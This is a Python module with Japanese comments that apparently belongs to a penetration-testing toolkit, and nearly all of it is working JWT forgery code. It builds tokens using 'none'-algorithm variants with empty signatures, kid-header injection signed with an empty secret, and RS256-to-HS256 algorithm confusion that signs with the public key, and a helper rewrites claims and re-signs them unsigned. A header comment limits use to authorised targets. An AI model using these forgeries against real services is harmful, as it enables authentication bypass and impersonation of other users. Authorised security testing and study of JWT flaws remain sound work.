"""
JWT Attacker - JWT脆弱性攻撃モジュール

JWT (JSON Web Token) に対する一般的な攻撃を実行する。
- None Algorithm
- 署名削除
- Weak Secret (Dictionary Attack)
- KID Manipulation
- Algorithm Confusion (RS256 -> HS256)

⚠️ 注意: 許可されたターゲットに対してのみ使用すること
"""

import json
import base64
import hmac
import hashlib
import re
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass

@dataclass
class JWTAttackResult:
    attack_type: str
    original_token: str
    forged_token: str
    description: str
    success_probability: str = "unknown"

class JWTAttacker:
    """JWT攻撃クラス"""

    def __init__(self, dictionary_path: Optional[str] = None):
        self.dictionary_path = dictionary_path

    def _base64url_decode(self, input_str: str) -> bytes:
        """Base64URLデコード"""
        rem = len(input_str) % 4
        if rem > 0:
            input_str += "=" * (4 - rem)
        return base64.urlsafe_b64decode(input_str)

    def _base64url_encode(self, input_bytes: bytes) -> str:
        """Base64URLエンコード"""
        return base64.urlsafe_b64encode(input_bytes).decode('utf-8').replace('=', '')

    def decode(self, token: str) -> Tuple[Dict, Dict, str]:
        """JWTをデコードしてヘッダー、ペイロード、署名を返す"""
        try:
            parts = token.split('.')
            if len(parts) != 3:
                raise ValueError("Invalid JWT format")
            
            header = json.loads(self._base64url_decode(parts[0]))
            payload = json.loads(self._base64url_decode(parts[1]))
            signature = parts[2]
            return header, payload, signature
        except Exception as e:
            raise ValueError(f"Failed to decode JWT: {e}")

    def forge_token(self, header: Dict, payload: Dict, secret: bytes = b"", alg: str = "HS256") -> str:
        """指定されたヘッダーとペイロードでトークンを生成"""
        header_enc = self._base64url_encode(json.dumps(header, separators=(',', ':')).encode())
        payload_enc = self._base64url_encode(json.dumps(payload, separators=(',', ':')).encode())
        
        signing_input = f"{header_enc}.{payload_enc}".encode()
        
        if alg == "none":
            signature = ""
        elif alg == "HS256":
            signature = self._base64url_encode(
                hmac.new(secret, signing_input, hashlib.sha256).digest()
            )
        else:
            # その他のアルゴリズムは簡易実装ではスキップ（必要に応じて拡張）
            signature = ""

        return f"{header_enc}.{payload_enc}.{signature}"

    def attack_none_algorithm(self, token: str) -> List[JWTAttackResult]:
        """None Algorithm攻撃ペイロードを生成"""
        results = []
        try:
            header, payload, _ = self.decode(token)
        except ValueError:
            return []

        # アルゴリズムをnoneに変更
        variations = ["none", "None", "NONE", "nOnE"]
        
        for alg in variations:
            new_header = header.copy()
            new_header["alg"] = alg
            
            # 署名なし
            forged = self.forge_token(new_header, payload, alg="none")
            results.append(JWTAttackResult(
                attack_type="None Algorithm",
                original_token=token,
                forged_token=forged,
                description=f"Algorithm set to '{alg}' with empty signature",
                success_probability="high"
            ))
            
            # 署名部分を残すパターン（稀にチェック回避できる）
            # forged_with_sig = forged + "." + "dummy" などの変種も考えられるが
            # ここでは標準的なNone Attackのみ
            
        return results

    def attack_kid_manipulation(self, token: str, injections: List[str]) -> List[JWTAttackResult]:
        """KID操作攻撃ペイロードを生成"""
        results = []
        try:
            header, payload, _ = self.decode(token)
        except ValueError:
            return []

        if "kid" not in header:
            return [] # KIDがない場合はスキップ

        for injection in injections:
            new_header = header.copy()
            new_header["kid"] = injection
            
            # 署名は元のキーがわからないため、とりあえず空か適当なHS256で署名するが、
            # KID Injectionは主に「攻撃者が制御できるキーファイル」を指定させる攻撃や
            # SQLi/Command Injectionを狙うもの。
            # ディレクトリトラバーサルの場合、対称鍵署名を期待して "/dev/null" 等を指定することもある。
            
            # ここではディレクトリトラバーサル攻撃を想定し、
            # 空文字（署名なし）ではなく、空の秘密鍵（/dev/null想定）でHS256署名してみる
            forged = self.forge_token(new_header, payload, secret=b"", alg="HS256")
            
            results.append(JWTAttackResult(
                attack_type="KID Manipulation",
                original_token=token,
                forged_token=forged,
                description=f"KID changed to '{injection}', signed with empty secret",
                success_probability="medium"
            ))

        return results

    def attack_algo_confusion(self, token: str, public_key_str: str) -> List[JWTAttackResult]:
        """
        Algorithm Confusion (RS256 -> HS256)
        公開鍵をHMACの秘密鍵として使用して署名する
        """
        results = []
        try:
            header, payload, _ = self.decode(token)
        except ValueError:
            return []

        if header.get("alg") != "RS256":
            return []

        new_header = header.copy()
        new_header["alg"] = "HS256"
        
        # 公開鍵をバイト列として使用
        secret = public_key_str.encode()
        
        forged = self.forge_token(new_header, payload, secret=secret, alg="HS256")
        
        results.append(JWTAttackResult(
            attack_type="Algorithm Confusion",
            original_token=token,
            forged_token=forged,
            description="Algorithm changed to HS256, signed using public key as HMAC secret",
            success_probability="medium"
        ))
        
        return results

    def modify_payload(self, token: str, claims: Dict[str, Any]) -> str:
        """ペイロードの値を変更して再構築（署名は無効になるため、None Attack等と組み合わせる前提）"""
        try:
            header, payload, _ = self.decode(token)
        except ValueError:
            return token

        payload.update(claims)
        
        # 再構築（とりあえずNoneで）
        # ※注: このメソッドは単体で使うより、他の攻撃メソッドと組み合わせて使うヘルパー的役割
        new_header = header.copy()
        new_header["alg"] = "none"
        return self.forge_token(new_header, payload, alg="none")

